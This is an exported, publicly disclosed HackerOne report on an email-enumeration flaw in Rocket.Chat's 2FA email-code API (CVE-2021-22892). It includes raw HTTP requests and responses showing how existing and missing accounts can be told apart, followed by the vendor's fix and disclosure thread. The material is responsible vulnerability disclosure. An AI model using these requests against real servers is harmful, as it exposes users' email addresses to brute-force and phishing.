{"id":1089116,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDg5MTE2","url":"https://hackerone.com/reports/1089116","title":"Hi! Security Team Rocket.Chat, It's possible to get information about the users emails without authentication","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2021-01-28T01:28:09.892Z","submitted_at":"2021-01-28T01:28:10.049Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"khekhe","url":"/khekhe","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":19858,"url":"https://hackerone.com/rocket_chat","handle":"rocket_chat","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Rocket.Chat","twitter_handle":"RocketChat","website":"https://rocket.chat","about":"Rocket.Chat is a company built on open source values and a love for efficiency. The company is driven by our amazing community of contributors."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2021-22892"],"singular_disclosure_disabled":false,"disclosed_at":"2021-04-29T15:09:06.025Z","bug_reporter_agreed_on_going_public_at":"2021-03-30T15:09:03.910Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Description:** \nEmail enumeration vulnerability.\nVulnerable api method: ```/api/v1/users.2fa.sendEmailCode```\n\n##Releases Affected::\n\n  * Rocket.Chat up to 3.10.5\n\nRequest for existing account:\n```\nPOST /api/v1/users.2fa.sendEmailCode HTTP/1.1\nHost: rocket-chat.local:3000\nReferer: http://rocket-chat.local:3000/home\nConnection: close\nContent-Length: 36\nContent-Type: application/json;charset=UTF-8\n\n{\"emailOrUsername\":\"test@test.test\"}\n```\nResponse\n```\nHTTP/1.1 200 OK\nX-XSS-Protection: 1\nX-Content-Type-Options: nosniff\nX-RateLimit-Limit: 10\nX-RateLimit-Remaining: 7\nX-RateLimit-Reset: 1611804788737\ncontent-type: application/json\nContent-Length: 16\n\n{\"success\":true}\n```\nRequest for non-existent account:\n```\nPOST /api/v1/users.2fa.sendEmailCode HTTP/1.1\nHost: rocket-chat.local:3000\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0\nAccept: */*\nAccept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nReferer: http://rocket-chat.local:3000/home\nConnection: close\nContent-Length: 37\nContent-Type: application/json;charset=UTF-8\n\n{\"emailOrUsername\":\"test2@test.test\"}\n```\nResponse\n```\nHTTP/1.1 400 Bad Request\nX-XSS-Protection: 1\nX-Content-Type-Options: nosniff\nX-Frame-Options: sameorigin\nPragma: no-cache\nX-RateLimit-Limit: 10\nX-RateLimit-Remaining: 9\nX-RateLimit-Reset: 1611805550459\nContent-Length: 94\n\n{\"success\":false,\"error\":\"Invalid user [error-invalid-user]\",\"errorType\":\"error-invalid-user\"}\n```\n\n\n## Suggested mitigation\n\n  * Use general messages when a user exists in the system and when user doesn't exist in the system.\n\n## Impact\n\nInformation disclosure which opens new attack vectors - helpful for injections/brute-force attacks/social-engineering etc.","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2021-04-29T15:09:03.997Z","allow_singular_disclosure_after":-14249685.5390736,"singular_disclosure_allowed":true,"vote_count":10,"voters":["0nlymohammed","h4x0r_dz","akashhamal0x01","sa1tama0","cryptographer","adass","ekgaribadmi","samuel-lucas6","meispi","waters_ro"],"severity":{"rating":"low","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":10604891,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@khekhe thanks for your report, we will include the fix in our roadmap and will keep you posted.","automated_response":false,"created_at":"2021-02-07T23:15:31.423Z","updated_at":"2021-02-07T23:15:31.423Z","actor":{"username":"rodrigok","cleared":false,"url":"/rodrigok","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/157/360/1a6d66a0def8a814709f86083492a3d43292901f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10828061,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @khekhe \n\njust saw this hasnt been triaged yet. will do it now. we are working on a fix.\n\nbest\nMarkus","automated_response":false,"created_at":"2021-02-28T01:09:37.118Z","updated_at":"2021-02-28T01:09:37.118Z","actor":{"username":"markus-rocketchat","cleared":false,"url":"/markus-rocketchat","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11139967,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @khekhe \n\nthanks again for your report. A release with a fix will be out later today. :)\n\nBest\nMarkus","automated_response":false,"created_at":"2021-03-26T15:40:41.668Z","updated_at":"2021-03-26T15:40:41.668Z","actor":{"username":"markus-rocketchat","cleared":false,"url":"/markus-rocketchat","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"khekhe","url":"/khekhe"},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11148871,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @markus-rocketchat \nThank you for responding! Can you request a CVE for the issue?","automated_response":false,"created_at":"2021-03-27T11:22:34.537Z","updated_at":"2021-03-27T11:22:34.537Z","actor":{"username":"khekhe","cleared":false,"url":"/khekhe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11158016,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @khekhe \n\nI requested a CVE. It will get published once this report here is published after the disclosure period. If you want to start this process, please request to disclose this report. Thank you.\n\nBest\nMarkus","automated_response":false,"created_at":"2021-03-28T21:06:18.100Z","updated_at":"2021-03-28T21:06:18.100Z","actor":{"username":"markus-rocketchat","cleared":false,"url":"/markus-rocketchat","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11184436,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-03-30T15:09:03.946Z","updated_at":"2021-03-30T15:09:03.946Z","first_to_agree":true,"actor":{"username":"khekhe","cleared":false,"url":"/khekhe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11566899,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-04-29T15:09:06.294Z","updated_at":"2021-04-29T15:09:06.294Z","actor":{"url":"/rocket_chat","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Rocket.Chat"}},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}